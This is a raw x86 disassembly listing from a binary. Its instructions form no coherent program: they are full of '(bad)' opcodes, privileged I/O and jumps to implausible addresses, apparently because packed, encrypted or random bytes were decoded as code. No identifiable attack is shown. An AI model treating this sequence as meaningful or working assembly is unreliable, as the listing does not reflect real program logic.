  401a02:	iret   
  401a03:	jbe    0x401a5b
  401a05:	pushf  
  401a06:	xchg   ebp,eax
  401a07:	adc    bh,BYTE PTR [ebx]
  401a09:	stc    
  401a0a:	outs   dx,DWORD PTR ds:[esi]
  401a0b:	jb     0x401a84
  401a0d:	adc    al,0x16
  401a0f:	and    ch,dl
  401a11:	jge    0x401a37
  401a13:	in     eax,0x85
  401a15:	mov    ecx,0x47bb9f83
  401a1a:	pop    edi
  401a1b:	outs   dx,DWORD PTR ds:[esi]
  401a1c:	dec    edi
  401a1d:	aas    
  401a1e:	jno    0x401a2f
  401a20:	inc    ebx
  401a21:	cmp    al,0x22
  401a23:	pop    ebp
  401a24:	scas   al,BYTE PTR es:[edi]
  401a25:	popa   
  401a26:	cmp    eax,0xb907ff09
  401a2b:	add    ah,ah
  401a2d:	cdq    
  401a2e:	ficomp DWORD PTR [edx-0x68e26b90]
  401a34:	mov    dh,0x2a
  401a36:	icebp  
  401a37:	mov    ebp,ebx
  401a39:	in     eax,0xf8
  401a3b:	or     ebx,DWORD PTR [edi-0x3c]
  401a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a3f:	aad    0x3d
  401a41:	jle    0x401a68
  401a43:	pusha  
  401a44:	fwait
  401a45:	xchg   DWORD PTR [eax],esi
  401a47:	pop    ebp
  401a48:	xchg   ebp,eax
  401a49:	sahf   
  401a4a:	jg     0x401ab1
  401a4c:	mov    dl,0x9a
  401a4e:	scas   eax,DWORD PTR es:[edi]
  401a4f:	hlt    
  401a50:	add    edi,DWORD PTR [esi+ebx*2+0x4]
  401a54:	sti    
  401a55:	lea    edx,[edi-0x50041c40]
  401a5b:	mov    eax,0xef99a56a
  401a60:	jne    0x401ad7
  401a62:	push   ss
  401a63:	jbe    0x401a9c
  401a65:	push   0xa75ddec0
  401a6a:	jns    0x401a33
  401a6c:	icebp  
  401a6d:	scas   eax,DWORD PTR es:[edi]
  401a6e:	sahf   
  401a6f:	mov    ecx,0x91565e12
  401a74:	(bad)  
  401a75:	jae    0x401a81
  401a77:	scas   eax,DWORD PTR es:[edi]
  401a78:	lods   al,BYTE PTR ds:[esi]
  401a79:	push   ebp
  401a7a:	or     al,0xc1
  401a7c:	jecxz  0x401ab2
  401a7e:	test   dh,dh
  401a80:	shl    DWORD PTR [esi-0x45],0xd
  401a84:	cmp    al,0x61
  401a86:	pop    edi
  401a87:	jle    0x401a11
  401a89:	das    
  401a8a:	pop    esp
  401a8b:	mov    bh,BYTE PTR [ecx+0x73]
  401a8e:	inc    eax
  401a8f:	(bad)  
  401a90:	and    esp,esi
  401a92:	iret   
  401a93:	sub    eax,0x3fb90a74
  401a98:	sar    BYTE PTR [eax+0x2c0c6739],cl
  401a9e:	arpl   WORD PTR [esi-0x61da1e34],bx
  401aa4:	cmp    DWORD PTR [edx+0x5b9b8746],eax
  401aaa:	mov    ch,0xd2
  401aac:	stos   BYTE PTR es:[edi],al
  401aad:	imul   esp,DWORD PTR [ecx-0x5b],0x20
  401ab1:	out    dx,eax
  401ab2:	jae    0x401ab9
  401ab4:	shl    BYTE PTR [ebp+0x20],1
  401ab7:	mov    ecx,0x1d8df060
  401abc:	sbb    al,0x40
  401abe:	(bad)  
  401abf:	mov    esp,0x16f6e0b4
  401ac4:	scas   al,BYTE PTR es:[edi]
  401ac5:	mov    dl,0xbc
  401ac7:	cmp    bh,ah
  401ac9:	repz retf 
  401acb:	jmp    0x401ac5
  401acd:	(bad)
  401ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad1:	push   ecx
  401ad2:	add    eax,0x3deb35ad
  401ad7:	stos   DWORD PTR es:[edi],eax
  401ad8:	lea    esp,fs:[ecx+0x55]
  401adc:	inc    esi
  401add:	mov    esi,0xd5e91fff
  401ae2:	leave  
  401ae3:	jle    0x401b15
  401ae5:	bound  esi,QWORD PTR [eax-0x4861b160]
  401aeb:	cdq    
  401aec:	ret    
  401aed:	cs jg  0x401b1b
  401af0:	inc    ebp
  401af1:	imul   eax,DWORD PTR [esi],0x59
  401af4:	rcl    cl,cl
  401af6:	sahf   
  401af7:	call   0x3c4b:0xeac27384
  401afe:	xchg   BYTE PTR [eax+0x57],ch
  401b01:	bound  edx,QWORD PTR [esi-0x2c]
  401b04:	dec    edx
  401b05:	sar    BYTE PTR [eax-0x306943e1],1
  401b0b:	push   ebx
  401b0c:	xor    ah,bh
  401b0e:	pop    ebx
  401b0f:	adc    ecx,DWORD PTR [edx+0x6]
  401b12:	mov    edi,DWORD PTR [ebx+eax*1]
  401b15:	xchg   edi,eax
  401b16:	out    dx,eax
  401b17:	out    dx,eax
  401b18:	pop    eax
  401b19:	cdq    
  401b1a:	clc    
  401b1b:	aad    0x33
  401b1d:	mov    esp,0x890c3736
  401b22:	xchg   ebp,eax
  401b23:	fs push es
  401b25:	ror    ah,0x46
  401b28:	fstp   DWORD PTR ds:0xfd24e6c2
  401b2e:	inc    ecx
  401b2f:	popf   
  401b30:	not    al
  401b32:	jne    0x401b86
  401b34:	stos   DWORD PTR es:[edi],eax
  401b35:	sbb    eax,esi
  401b37:	or     BYTE PTR [ebp+0x6d1570a4],bl
  401b3d:	je     0x401b05
  401b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b40:	rcr    BYTE PTR [edi+0xf],0x30
  401b44:	mov    ebp,0xb5f796fc
  401b49:	call   0xb9a8b33d
  401b4e:	pop    eax
  401b4f:	(bad)  [ebx]
  401b51:	mov    BYTE PTR [ecx+0x5e],cl
  401b54:	xor    DWORD PTR [esi+0x6b],eax
  401b57:	aam    0x2d
  401b59:	fstp   QWORD PTR [edi+0x42]
  401b5c:	and    DWORD PTR [ecx+0x3bfe6859],ebx
  401b62:	ss cmp edx,esi
  401b65:	push   esi
  401b66:	jb     0x401b9a
  401b68:	sub    dh,BYTE PTR [ebp-0x58]
  401b6b:	cmp    esp,DWORD PTR [ebp-0x63a1e420]
  401b71:	ror    bl,cl
  401b73:	pop    esi
  401b74:	and    BYTE PTR [ecx+0x4f],bl
  401b77:	jmp    0x401bab
  401b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b7a:	lods   al,BYTE PTR ds:[esi]
  401b7b:	imul   edx,DWORD PTR [eax-0x5c7dc6a6],0xf297a6ed
  401b85:	inc    esi
  401b86:	stc    
  401b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b88:	or     eax,0x432fb4c4
  401b8d:	dec    ebp
  401b8e:	test   eax,0xadc0b0d0
  401b93:	xchg   ebp,eax
  401b94:	jbe    0x401bc2
  401b96:	push   edx
  401b97:	jae    0x401b42
  401b99:	pusha  
  401b9a:	push   edi
  401b9b:	clc    
  401b9c:	sub    eax,0x607235c1
  401ba1:	(bad)  
  401ba2:	in     al,dx
  401ba3:	(bad)  
  401ba4:	xchg   edx,eax
  401ba5:	or     al,0x7d
  401ba7:	xor    esp,DWORD PTR [edx]
  401ba9:	fwait
  401baa:	jecxz  0x401bb7
  401bac:	into   
  401bad:	inc    edx
  401bae:	fstp   QWORD PTR [edx+0x2606e957]
  401bb4:	or     esi,ebp
  401bb6:	int    0xed
  401bb8:	shl    BYTE PTR [ebp-0x6cfa5dca],cl
  401bbe:	int3   
  401bbf:	call   0x91e8:0x92d4d1f9
  401bc6:	mov    edi,0x3b28c5bf
  401bcb:	stc    
  401bcc:	mov    DWORD PTR [ecx-0x21],ebp
  401bcf:	ret    0x95bc
  401bd2:	add    ah,BYTE PTR [edi-0x46edf1b9]
  401bd8:	aad    0x6c
  401bda:	sahf   
  401bdb:	(bad)  
  401bdc:	popa   
  401bdd:	(bad)  
  401bde:	ficom  WORD PTR [ebx-0x5c850ba7]
  401be4:	sti    
  401be5:	add    eax,DWORD PTR [ebp-0x1]
  401be8:	into   
  401be9:	or     BYTE PTR gs:[edx-0x78],al
  401bed:	xchg   edx,eax
  401bee:	cli    
  401bef:	(bad)  
  401bf0:	mov    dl,BYTE PTR [edi]
  401bf2:	addr16 ret 
  401bf4:	or     BYTE PTR [edx],ah
  401bf6:	mov    al,ds:0xbab2002
  401bfb:	sub    bh,BYTE PTR [eax]
  401bfd:	mov    dh,0x51
  401bff:	stos   DWORD PTR es:[edi],eax
  401c00:	pop    eax
  401c01:	lods   eax,DWORD PTR ds:[esi]
  401c02:	pushf  
  401c03:	xor    ah,BYTE PTR [ebx]
  401c05:	dec    edi
  401c06:	jns    0x401ba6
  401c08:	push   0x72
  401c0a:	iret   
  401c0b:	inc    esp
  401c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c0d:	sar    BYTE PTR [eax+0x6cc187a],cl
  401c13:	in     al,dx
  401c14:	and    cl,BYTE PTR [ecx+0x33fffb9c]
  401c1a:	shl    BYTE PTR [ebx+esi*2-0x38],0xb
  401c1f:	fnstenv [ebx-0x3eed8af5]
  401c25:	xor    cl,BYTE PTR [eax]
  401c27:	test   BYTE PTR [ebx],0x34
  401c2a:	cmp    BYTE PTR [edi],dl
  401c2c:	jmp    0x401c04
  401c2e:	xchg   ebp,eax
  401c2f:	and    BYTE PTR [ecx-0x69],dh
  401c32:	xchg   DWORD PTR [eax-0x7940263a],esi
  401c38:	cs cwde 
  401c3a:	out    dx,al
  401c3b:	sahf   
  401c3c:	xchg   ecx,eax
  401c3d:	(bad)  
  401c3e:	cdq    
  401c3f:	(bad)  
  401c40:	adc    al,0x84
  401c42:	hlt    
  401c43:	lahf   
  401c44:	out    0x7c,eax
  401c46:	and    BYTE PTR ss:[edi-0x77207d89],al
  401c4d:	imul   edx,DWORD PTR [ecx-0x5c],0x3f92e38f
  401c54:	xchg   edi,eax
  401c55:	or     BYTE PTR [eax-0x3f],ch
  401c58:	lods   eax,DWORD PTR ds:[esi]
  401c59:	pop    ecx
  401c5a:	inc    ebp
  401c5b:	and    ch,BYTE PTR [ebx+0x20]
  401c5e:	out    0x4c,al
  401c60:	fisttp QWORD PTR [eax+0x3b]
  401c63:	fidivr WORD PTR [ebx+0x55a69663]
  401c69:	dec    BYTE PTR [eax-0x68]
  401c6c:	sar    bl,cl
  401c6e:	mov    dh,0x41
  401c70:	sub    esp,DWORD PTR [esi+0x6f6e86ca]
  401c76:	popa   
  401c77:	sbb    eax,0xd0a2f039
  401c7c:	in     al,dx
  401c7d:	jecxz  0x401c38
  401c7f:	std    
  401c80:	out    dx,al
  401c81:	jo     0x401cf3
  401c83:	sub    eax,0xdb4a6b91
  401c88:	in     al,0x28
  401c8a:	cld    
  401c8b:	or     dl,BYTE PTR [edx+0x4d2944e2]
  401c91:	mov    al,0x3a
  401c93:	retf   0xf296
  401c96:	stos   DWORD PTR es:[edi],eax
  401c97:	div    DWORD PTR [edx]
  401c99:	aaa    
  401c9a:	mov    bl,0x3f
  401c9c:	or     ch,BYTE PTR [esi]
  401c9e:	sub    eax,0xcb8474dd
  401ca3:	xchg   ebp,eax
  401ca4:	pop    esi
  401ca5:	dec    ebp
  401ca6:	xchg   esi,eax
  401ca7:	pop    edi
  401ca8:	int3   
  401ca9:	inc    edi
  401caa:	ds jmp 0x1272:0xaabb3410
  401cb2:	fwait
  401cb3:	out    0x2,eax
  401cb5:	enter  0x978f,0x96
  401cb9:	lea    esp,[ebx]
  401cbb:	rcr    DWORD PTR [esp+edi*2],cl
  401cbe:	ins    BYTE PTR es:[edi],dx
  401cbf:	out    0x27,al
  401cc1:	sub    eax,0xf89e4328
  401cc6:	sahf   
  401cc7:	xchg   ebx,eax
  401cc8:	addr16 mov esi,0xd87b2cac
  401cce:	add    DWORD PTR [eax+0x51068e7b],edx
  401cd4:	xor    DWORD PTR ds:0x33cf7903,0x1f8567ea
  401cde:	jae    0x401d05
  401ce0:	mov    ebx,0xb962b4cc
  401ce5:	aaa    
  401ce6:	fsubr  st(2),st
  401ce8:	leave  
  401ce9:	or     al,0xa3
  401ceb:	or     al,0x78
  401ced:	jb     0x401cb9
  401cef:	(bad)  
  401cf0:	sub    al,0xf2
  401cf2:	jb     0x401d5e
  401cf4:	or     bh,ch
  401cf6:	(bad)  
  401cf8:	shr    DWORD PTR [ecx-0x44161db5],cl
  401cfe:	scas   eax,DWORD PTR es:[edi]
  401cff:	sub    edi,edx
  401d01:	mov    eax,0x54fb2f63
  401d06:	cmp    cl,0xee
  401d09:	push   0x70
  401d0b:	jne    0x401cdb
  401d0d:	push   ebp
  401d0e:	fdivr  DWORD PTR [ebx]
  401d10:	mov    WORD PTR [ecx+0x2fea16ee],fs
  401d16:	mov    edi,0x106c9091
  401d1b:	scas   al,BYTE PTR es:[edi]
  401d1c:	(bad)  
  401d1e:	out    dx,eax
  401d1f:	clc    
  401d20:	ret    
  401d21:	shl    BYTE PTR [edx-0x2ccea5df],0xd4
  401d28:	push   ds
  401d29:	ror    BYTE PTR [esi-0x6685b59a],0xd7
  401d30:	and    eax,0xe8c06d0
  401d35:	aam    0x81
  401d37:	inc    ebp
  401d38:	ja     0x401db0
  401d3a:	pop    ebx
  401d3b:	push   0x43a21686
  401d40:	pop    edx
  401d41:	adc    BYTE PTR [ecx+0x5c3136d7],bl
  401d47:	das    
  401d48:	and    bl,BYTE PTR [ebp+0x13683d45]
  401d4e:	fdiv   DWORD PTR [edx+edx*1+0x6b58dbe6]
  401d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d56:	pop    edi
  401d57:	int3   
  401d58:	call   FWORD PTR ds:0xf9aeb9c2
  401d5e:	adc    BYTE PTR [ecx+eiz*2-0x2b],bh
  401d62:	gs in  al,0xea
  401d65:	add    edx,DWORD PTR [ebx-0x7b]
  401d68:	fnstsw WORD PTR [edi]
  401d6a:	sub    esp,eax
  401d6c:	retf   0xdd3c
  401d6f:	add    edx,DWORD PTR [esi-0x12]
  401d72:	lds    ebp,FWORD PTR [eax+0x1ffac042]
  401d78:	fsub   QWORD PTR [edi+0x58]
  401d7b:	rcl    BYTE PTR [eax],0xcf
  401d7e:	sbb    esp,DWORD PTR [edi+0x675ef846]
  401d84:	mov    esi,0x25981732
  401d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8a:	cmp    al,BYTE PTR [edx+0x23]
  401d8d:	push   ds
  401d8e:	push   ss
  401d8f:	xchg   DWORD PTR [edx],esi
  401d91:	lods   al,BYTE PTR ds:[esi]
  401d92:	out    0x27,eax
  401d94:	mov    eax,0xc02d0772
  401d99:	outs   dx,DWORD PTR ds:[esi]
  401d9a:	clc    
  401d9b:	repnz pop es
  401d9d:	push   cs
  401d9e:	into   
  401d9f:	pop    esi
  401da0:	mov    ebx,0xe870b82a
  401da5:	push   ebp
  401da6:	or     dl,BYTE PTR [ecx]
  401da8:	loopne 0x401dc3
  401daa:	sar    edi,0xb7
  401dad:	ficom  DWORD PTR [edi]
  401daf:	and    BYTE PTR [edi+eiz*8-0x4d6140f0],dl
  401db6:	mov    dl,bh
  401db8:	dec    edi
  401db9:	repnz mov al,0x43
  401dbc:	xlat   BYTE PTR ds:[ebx]
  401dbd:	rcr    BYTE PTR [edi+0x63],cl
  401dc0:	inc    edx
  401dc1:	pop    ecx
  401dc2:	jp     0x401dde
  401dc4:	sahf   
  401dc5:	gs je  0x401e46
  401dc8:	and    bh,BYTE PTR [ecx]
  401dca:	sbb    eax,0x9228130a
  401dcf:	mov    WORD PTR [esi-0x41],ss
  401dd2:	xchg   ebp,eax
  401dd3:	mov    DWORD PTR [edi],ebx
  401dd5:	loopne 0x401e36
  401dd7:	adc    BYTE PTR [edx+0x49576bf3],0xa9
  401dde:	hlt    
  401ddf:	test   DWORD PTR [edx-0x71],edi
  401de2:	test   eax,0xf17356ea
  401de7:	add    DWORD PTR [ebp+0x18],ebx
  401dea:	adc    DWORD PTR [eax],esi
  401dec:	or     ch,BYTE PTR [edx+0x4121b263]
  401df2:	jae    0x401dc6
  401df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401df5:	out    0x1a,eax
  401df7:	sahf   
  401df8:	pop    esi
  401df9:	push   0xffffff91
  401dfb:	fs jb  0x401db3
  401dfe:	or     edi,ecx
  401e00:	imul   edx,DWORD PTR [ecx+ebp*1-0x2a],0xffffff84
  401e05:	cmc    
  401e06:	mov    fs,WORD PTR [esi+0x74]
  401e09:	es into 
  401e0b:	loopne 0x401df4
  401e0d:	scas   al,BYTE PTR es:[edi]
  401e0e:	sub    DWORD PTR [edi+0x66],edx
  401e11:	popa   
  401e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e13:	dec    ecx
  401e14:	fimul  WORD PTR [ecx+0x14]
  401e17:	das    
  401e18:	out    dx,eax
  401e19:	aas    
  401e1a:	pop    edx
  401e1b:	jns    0x401e63
  401e1d:	in     eax,0xf4
  401e1f:	add    al,0xce
  401e21:	leave  
  401e22:	retf   0x9974
  401e25:	lea    ecx,[ebx+0x2e94e090]
  401e2b:	int3   
  401e2c:	sbb    BYTE PTR [ebx],bl
  401e2e:	out    0x57,eax
  401e30:	stos   DWORD PTR es:[edi],eax
  401e31:	pop    eax
  401e32:	push   eax
  401e33:	das    
  401e34:	mov    al,ds:0x9f45c045
  401e39:	mov    ?,WORD PTR [ebx+0xf437e9e]
  401e3f:	cmc    
  401e40:	mov    DWORD PTR [edx],esp
  401e42:	das    
  401e43:	call   0x1d5a20cb
  401e48:	hlt    
  401e49:	pop    esi
  401e4a:	sub    al,BYTE PTR [ecx-0x12]
  401e4d:	xchg   esp,eax
  401e4e:	cmp    BYTE PTR [ebx+ebx*8+0x5d],cl
  401e52:	sti    
  401e53:	mov    al,ds:0x6102e603
  401e58:	outs   dx,BYTE PTR ds:[esi]
  401e59:	pop    ebp
  401e5a:	(bad)  
  401e5b:	sahf   
  401e5c:	aam    0x64
  401e5e:	pop    es
  401e5f:	icebp  
  401e60:	lahf   
  401e61:	adc    edx,ecx
  401e63:	lds    esi,FWORD PTR [edx+0x40]
  401e66:	mov    esp,0x216e14bd
  401e6b:	dec    edx
  401e6c:	mov    ah,0xa1
  401e6e:	jl     0x401ee4
  401e70:	inc    edx
  401e72:	jg     0x401ebb
  401e74:	mov    ch,0x16
  401e76:	cmp    BYTE PTR [ebx-0x343e408f],bl
  401e7c:	xchg   ebx,eax
  401e7d:	and    eax,ebp
  401e7f:	nop
  401e80:	jnp    0x401ea7
  401e82:	push   edx
  401e83:	ins    BYTE PTR es:[edi],dx
  401e84:	add    al,0x4b
  401e86:	dec    edx
  401e87:	mov    al,dl
  401e89:	(bad)  
  401e8a:	dec    ecx
  401e8b:	popf   
  401e8c:	add    al,0xa
  401e8e:	add    DWORD PTR [eax],esi
  401e90:	rol    BYTE PTR [ebx-0x2998718f],1
  401e96:	bnd jbe 0x401e7c
  401e99:	ds push edi
  401e9b:	inc    edi
  401e9c:	sub    eax,0xf6b0d9da
  401ea1:	jp     0x401e53
  401ea3:	ins    BYTE PTR es:[edi],dx
  401ea4:	mov    ch,0xf5
  401ea6:	xchg   DWORD PTR [edx],esi
  401ea8:	jmp    0x6fdc2a91
  401ead:	and    bl,BYTE PTR [edx]
  401eaf:	add    ah,BYTE PTR [ebp+edx*4+0x24]
  401eb3:	sub    esp,DWORD PTR [ebx-0x5852b395]
  401eb9:	loop   0x401ec8
  401ebb:	jmp    0x4bb8e35f
  401ec0:	xchg   esi,eax
  401ec1:	mov    ebx,0x8d6a6f8c
  401ec6:	and    dl,cl
  401ec8:	add    eax,DWORD PTR [edi-0x2c]
  401ecb:	xchg   esp,eax
  401ecc:	and    esi,edx
  401ece:	inc    ebx
  401ecf:	sti    
  401ed0:	sar    DWORD PTR [ebx-0x79edffb5],cl
  401ed6:	push   esp
  401ed7:	mov    dh,0x66
  401ed9:	out    dx,eax
  401eda:	gs aaa 
  401edc:	jl     0x401edb
  401ede:	ror    dl,1
  401ee0:	or     ah,dl
  401ee2:	cmp    BYTE PTR [esi+0x4d],dl
  401ee5:	adc    BYTE PTR [eax],ah
  401ee7:	(bad)  
  401ee8:	frstor [eax+ecx*4+0x74]
  401eec:	xchg   edi,eax
  401eed:	cwde   
  401eee:	cmp    bl,BYTE PTR [edi]
  401ef0:	test   al,0xd
  401ef2:	ret    0xfc5d
  401ef5:	inc    edi
  401ef6:	cdq    
  401ef7:	dec    edi
  401ef8:	out    dx,al
  401ef9:	cld    
  401efa:	adc    ecx,ebx
  401efc:	dec    eax
  401efd:	dec    eax
  401efe:	fsubr  QWORD PTR [ebx+0x432f8f21]
  401f04:	repz in eax,0xbb
  401f07:	push   esi
  401f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f09:	ins    DWORD PTR es:[edi],dx
  401f0a:	test   al,0xb
  401f0c:	js     0x401f6c
  401f0e:	fdivr  st(1),st
  401f10:	jbe    0x401ee7
  401f12:	pop    ebx
  401f13:	pop    ecx
  401f14:	std    
  401f15:	outs   dx,DWORD PTR ds:[esi]
  401f16:	inc    esp
  401f17:	sub    DWORD PTR [esi+0x15],ebx
  401f1a:	ins    DWORD PTR es:[edi],dx
  401f1b:	outs   dx,DWORD PTR ds:[esi]
  401f1c:	mov    al,0xef
  401f1e:	jns    0x401f8a
  401f20:	(bad)  [esi+0x212ad6f1]
  401f26:	inc    esi
  401f27:	test   al,0xe1
  401f29:	rcr    BYTE PTR [edi+0xa],1
  401f2c:	std    
  401f2d:	add    al,0x49
  401f2f:	pop    ebx
  401f30:	or     al,0x4d
  401f32:	jb     0x401f97
  401f34:	adc    dh,BYTE PTR [ebx+eiz*1+0x115f1574]
  401f3b:	(bad)  
  401f3c:	cmp    bl,BYTE PTR [esi+0x3f]
  401f3f:	jmp    0xb5fd3a05
  401f44:	sub    ecx,DWORD PTR [esi+0x55]
  401f47:	arpl   WORD PTR [ebx-0x336d992e],ax
  401f4d:	push   ebp
  401f4e:	dec    edx
  401f4f:	jo     0x401fb0
  401f51:	inc    edi
  401f52:	xor    al,0xe0
  401f54:	jo     0x401ed8
  401f56:	push   ebx
  401f57:	ds in  eax,0xab
  401f5a:	cld    
  401f5b:	mov    dl,0x43
  401f5d:	rcr    BYTE PTR [ebx-0x571be83f],0x56
  401f64:	cmp    esp,DWORD PTR [esi]
  401f66:	and    esp,DWORD PTR [eax]
  401f68:	push   ebx
  401f69:	test   DWORD PTR [edi-0x3c0973b2],esp
  401f6f:	and    ebx,edi
  401f71:	mov    edx,0x83d526e3
  401f76:	repnz add ch,BYTE PTR [esp+ebx*4-0x1543c426]
  401f7e:	lock add eax,edi
  401f81:	cli    
  401f82:	(bad)  
  401f83:	xchg   esi,eax
  401f84:	add    eax,0x5579a91b
  401f89:	imul   ecx,DWORD PTR [edi+0x5a],0xdf773064
  401f90:	cld    
  401f91:	mov    esi,0x4815b2c9
  401f96:	test   eax,0xbf7b649
  401f9b:	shr    DWORD PTR [ebp-0xd242d03],cl
  401fa1:	sub    bh,BYTE PTR [ebx]
  401fa3:	sub    esi,DWORD PTR [esi]
  401fa5:	aaa    
  401fa6:	in     al,dx
  401fa7:	add    BYTE PTR [eax],dh
  401fa9:	inc    ebx
  401faa:	push   esi
  401fab:	ret    0xcbaf
  401fae:	lods   al,BYTE PTR ds:[esi]
  401faf:	mov    bh,0xc1
  401fb1:	dec    edi
  401fb2:	cmc    
  401fb3:	into   
  401fb4:	xor    al,0xae
  401fb6:	outs   dx,DWORD PTR ds:[esi]
  401fb7:	cmp    DWORD PTR [eax],ebx
  401fb9:	int3   
  401fba:	dec    edx
  401fbb:	cdq    
  401fbc:	je     0x401f70
  401fbe:	fidiv  WORD PTR [eax+edi*8-0x5]
  401fc2:	xchg   ebx,eax
  401fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fc4:	dec    ecx
  401fc5:	ss xchg esi,eax
  401fc7:	sbb    DWORD PTR [ebp+esi*4+0x5c],esi
  401fcb:	jnp    0x401ff0
  401fcd:	cmc    
  401fce:	mov    cl,0x92
  401fd0:	cli    
  401fd1:	fsubr  QWORD PTR [eax+0x1052981]
  401fd7:	ret    0xd09c
  401fda:	imul   edx,DWORD PTR [edi],0x5
  401fdd:	cli    
  401fde:	je     0x401f84
  401fe0:	ins    DWORD PTR es:[edi],dx
  401fe1:	enter  0xe94,0x26
  401fe5:	fmul   QWORD PTR [eax]
  401fe7:	pusha  
  401fe8:	(bad)  [eax-0x7a5bb789]
  401fee:	imul   edi,DWORD PTR [ecx-0x43],0xffffff89
  401ff2:	ret    
  401ff3:	pop    esi
  401ff4:	mov    esi,0x7b3e7b80
  401ff9:	sub    eax,0xaf993fa3
  401ffe:	scas   eax,DWORD PTR es:[edi]
  401fff:	sub    DWORD PTR [edx+ecx*4+0x53fc5e6e],0xffffffbc
  402007:	loop   0x401fbf
  402009:	dec    esp
  40200a:	leave  
  40200b:	imul   DWORD PTR [eax-0x35fcde9b]
  402011:	arpl   WORD PTR [edx],ax
  402013:	mov    ecx,0xffb7a08d
  402018:	data16 data16 sub al,0x3
  40201c:	outs   dx,BYTE PTR ds:[esi]
  40201d:	cmp    al,0xec
  40201f:	out    dx,al
  402020:	push   ds
  402021:	cmc    
  402022:	jmp    ebx
  402024:	bound  ebp,QWORD PTR [edx-0x1ddab06c]
  40202a:	jno    0x402047
  40202c:	lods   al,BYTE PTR ds:[esi]
  40202d:	sbb    cl,BYTE PTR [ecx+0x73fc0367]
  402033:	and    al,dl
  402035:	gs ins BYTE PTR es:[edi],dx
  402037:	lock pop esi
  402039:	stc    
  40203a:	lds    ebp,FWORD PTR [eax]
  40203c:	pop    ebp
  40203d:	or     DWORD PTR [edx+0x4ead3fda],edi
  402043:	mov    ah,0xa3
  402045:	sub    al,0x51
  402047:	sahf   
  402048:	popa   
  402049:	test   eax,0x300dd649
  40204e:	in     eax,dx
  40204f:	repz mov esp,0xb628ac89
  402055:	mov    ch,0x8
  402057:	sub    ah,0x90
  40205a:	mov    eax,ds:0xfc8d501c
  40205f:	and    eax,0xd720aae2
  402064:	es clc 
  402066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402067:	push   ebp
  402068:	stc    
  402069:	pop    ebp
  40206a:	pop    ebx
  40206b:	test   DWORD PTR [ebp+edx*2-0x21ab88c9],0x6f6edd1d
  402076:	push   ebp
  402077:	sbb    ebx,DWORD PTR [ecx+0x37d42f14]
  40207d:	fcomp  DWORD PTR [ecx+0x7a]
  402080:	xor    DWORD PTR [ebx+0x6c837434],esp
  402086:	shl    BYTE PTR [ebx+0x5b4951f2],0x7d
  40208d:	retf   0xb34e
  402090:	cmp    esi,DWORD PTR [esi+0x5b]
  402093:	ins    BYTE PTR es:[edi],dx
  402094:	xchg   ebx,eax
  402095:	aas    
  402096:	in     al,dx
  402097:	mov    dl,0x4
  402099:	test   eax,0xf2c699d4
  40209e:	int3   
  40209f:	das    
  4020a0:	arpl   WORD PTR [eax],cx
  4020a2:	pop    esi
  4020a4:	in     al,0x67
  4020a6:	and    ecx,esi
  4020a8:	cwde   
  4020a9:	popa   
  4020aa:	or     BYTE PTR [eax+0x63],al
  4020ad:	add    DWORD PTR [edi-0x4ac05061],esi
  4020b3:	aaa    
  4020b4:	cmp    BYTE PTR [ecx-0x36],bh
  4020b7:	into   
  4020b8:	sti    
  4020b9:	sbb    al,0xdb
  4020bb:	mov    al,0x4c
  4020bd:	cmp    ch,BYTE PTR [edi-0x76949c18]
  4020c3:	mov    bh,0x3d
  4020c5:	pop    es
  4020c6:	and    DWORD PTR [ebx+0x3d4af835],edx
  4020cc:	jae    0x4020f8
  4020ce:	cmp    al,0xde
  4020d0:	cmp    ah,BYTE PTR [esi-0x347fc24f]
  4020d6:	xchg   edi,eax
  4020d7:	mov    bl,0x55
  4020d9:	sub    al,0xb3
  4020db:	fwait
  4020dc:	mov    al,ds:0x124ac7b1
  4020e2:	leave  
  4020e3:	std    
  4020e4:	or     DWORD PTR [ecx],edi
  4020e6:	inc    esp
  4020e7:	xor    esp,DWORD PTR [edi+0xebbd67]
  4020ed:	jle    0x40215c
  4020ef:	je     0x40208e
  4020f1:	bnd jb 0x40213a
  4020f4:	icebp  
  4020f5:	dec    edi
  4020f6:	jae    0x402148
  4020f8:	add    al,0x7
  4020fa:	rcl    ch,0x4c
  4020fd:	cli    
  4020fe:	push   ecx
  4020ff:	xchg   esi,eax
  402100:	mov    fs,WORD PTR [esi+0x8]
  402103:	in     eax,dx
  402104:	pop    ebx
  402105:	fdiv   DWORD PTR [ebp+0x26ef2778]
  40210b:	xor    bl,BYTE PTR [esp+ebp*4-0x7614bc84]
  402112:	xchg   cl,bh
  402114:	loopne 0x402117
  402116:	adc    eax,0x4d85e52c
  40211b:	sbb    dh,BYTE PTR [eax-0x877f656]
  402121:	mov    ds:0x56495fa5,eax
  402126:	pop    ebp
  402127:	out    0xea,eax
  402129:	stc    
  40212a:	lods   eax,DWORD PTR ds:[esi]
  40212b:	mov    eax,0xa1210e1e
  402130:	jb     0x402176
  402132:	adc    BYTE PTR [ebx],ch
  402134:	repz shr DWORD PTR [esi-0x4fd200f2],1
  40213b:	jmp    0xe3670762
  402140:	hlt    
  402141:	loopne 0x402137
  402143:	cli    
  402144:	cmp    BYTE PTR [edx-0x32],al
  402147:	arpl   WORD PTR [ecx],si
  402149:	cmp    ah,dh
  40214b:	fidiv  WORD PTR ds:0xa6374be9
  402151:	xor    ebx,DWORD PTR [edx-0x41091467]
  402157:	jno    0x402167
  402159:	out    dx,al
  40215a:	dec    ecx
  40215b:	pop    ecx
  40215c:	inc    esp
  40215d:	pop    esp
  40215e:	cmp    esp,ebp
  402160:	or     BYTE PTR [eax],ch
  402162:	sbb    eax,0xd67753d0
  402167:	push   eax
  402168:	xchg   BYTE PTR [edx-0x3b],cl
  40216b:	inc    ebp
  40216c:	jbe    0x402148
  40216e:	push   ds
